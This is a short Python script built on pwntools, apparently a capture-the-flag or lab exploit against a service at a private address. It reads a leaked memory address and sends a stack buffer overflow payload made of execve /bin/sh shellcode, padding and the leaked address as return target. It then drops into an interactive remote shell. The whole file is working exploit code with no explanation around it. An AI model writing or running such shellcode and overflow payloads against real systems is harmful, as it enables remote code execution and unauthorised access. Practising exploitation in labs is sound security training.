#!/usr/bin/python3
import os

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *

p = remote('10.13.37.10', 60001)  # Adjust the port if necessary
# receive until we see this text
p.recvuntil("Oops, I'm leaking! ")
# store leaked libc base address
leak = int(p.recvuntil("\n").strip(), 16)
log.info('Libc address: {}'.format(hex(leak)))
p.recvuntil("> ")
# execve x64 shellcode 30 bytes - https://www.exploit-db.com/exploits/37362/
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
padding = b"A" * (72 - len(shellcode))
payload = shellcode + padding + p64(leak)

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()

